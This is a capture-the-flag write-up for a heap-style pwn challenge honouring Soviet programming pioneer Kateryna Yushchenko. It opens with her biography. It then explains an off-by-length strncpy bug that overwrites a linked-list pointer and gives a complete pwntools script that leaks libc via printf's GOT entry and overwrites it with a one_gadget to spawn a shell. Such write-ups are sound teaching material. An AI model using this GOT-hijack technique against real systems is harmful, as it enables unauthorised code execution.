# KaterynaYushchenko

## Prompt

[Kateryna Lohvynivna Yushchenko](https://en.wikipedia.org/wiki/Kateryna_Yushchenko_(scientist)) (Ukrainian: Катерина Логвинівна Ющенко, Russian: Екатерина Логвиновна Ющенко, 8 December 1919, Chyhyryn; died 15 August 2001) was a Soviet Ukrainian computer and information research scientist, corresponding member of USSR Academy of Sciences (1976), and member of The International Academy of Computer Science. She developed one of the world's first high-level languages with indirect address in programming (Pointers are analogous to this addressing), called the Address programming language. Over the period of her academic career, Yushchenko supervised 45 Ph.D. students. Further professional achievements include Yushchenko being awarded two USSR State Prizes, The USSR Council of Ministers Prize, The Academician Glushkov Prize, and The Order of Princess Olga. Yushchenko was the first woman in the USSR to become a Doctor of Physical and Mathematical Sciences in programming. - [Wikipedia Entry (https://en.wikipedia.org/wiki/Kateryna_Yushchenko_(scientist))

Chal: We built a pwn worthy of the inventor of indirect addressing. 

Connection: `` 0.cloud.chals.io 12733``

## Solution

There is a bug in the edit function that allows you to write beyond the boundary of the item in the linked list, overwriting the pointer. 

```c
    if (strlen(newName) < 50) {
                strncpy(current->name, newName, strlen(newName));
                current->name[50] = '\0';  
            } else {
                strncpy(current->name, newName, 60);
            }
```

You can abuse this to overwrite the pointer with the address of a GOT entry. For various reasons, many of the GOT entries will cause crashes when used. The ``printf()`` ended up working without a crash. We then replace that with a call to ``one_gadget`` by adding another item that gets written at the GOT entry for printf.

```python
from pwn import *

binary = './heroine.bin_patched'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 12733)
    else:
        return process(e.path)


def add(heroine):
    log.info('Adding Heroine: %s' % heroine)
    p.recvuntil(b'>>>')
    p.sendline(b'2')
    p.sendline(heroine)


def edit(old, new):
    log.info('Editing %s<-%s' % (old, new))
    p.recvuntil(b'>>>')
    p.sendline(b'4')
    p.sendline(old)
    p.sendline(new)


def show():
    log.info('Showing heroines')
    p.recvuntil(b'>>>')
    p.sendline(b'1')


p = start()


def init_db():
    for i in range(0, 3):
        add(chr(0x41+i).encode()*4)


def leak():
    edit(b'B'*4, b'B'*56+p64(e.got['printf']))
    show()
    for _ in range(0, 3):
        p.recvuntil(b'<<< Cyber Heroine: ')
    leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
    log.info('Printf Leak : 0x%x' % leak)
    libc.address = leak-libc.sym['printf']
    log.info('Libc Leak   : 0x%x' % libc.address)


def overwrite():
    one_gadget = libc.address+0xe3b04
    add(p64(one_gadget))


init_db()
leak()
overwrite()
p.interactive()
```